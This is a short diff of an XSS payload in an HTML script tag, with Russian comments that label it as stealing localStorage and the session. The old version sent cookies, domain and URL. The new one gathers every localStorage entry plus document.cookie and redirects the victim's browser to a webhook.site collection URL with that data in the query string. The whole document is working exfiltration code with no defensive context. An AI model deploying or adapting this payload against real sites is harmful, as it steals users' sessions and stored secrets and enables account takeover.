@@ -1,16 +1,14 @@
 <script>
-// Отправляем ВСЮ возможную информацию
-var data = {
-    cookies: document.cookie,
-    domain: document.domain,
-    url: window.location.href,
-    userAgent: navigator.userAgent,
-    timestamp: new Date().toISOString()
-};
+// Украсть localStorage
+var storage = "";
+for(var i=0; i<localStorage.length; i++) {
+    var key = localStorage.key(i);
+    storage += key + "=" + localStorage.getItem(key) + "; ";
+}
 
-// Вариант 1 - в URL (самый надежный)
-window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?" + 
-    "cookies=" + encodeURIComponent(data.cookies) + 
-    "&domain=" + encodeURIComponent(data.domain) +
-    "&url=" + encodeURIComponent(data.url);
+// Украсть сессию
+window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?localStorage=" + 
+    encodeURIComponent(storage) +
+    "&cookies=" + encodeURIComponent(document.cookie) +
+    "&domain=" + document.domain;
 </script>
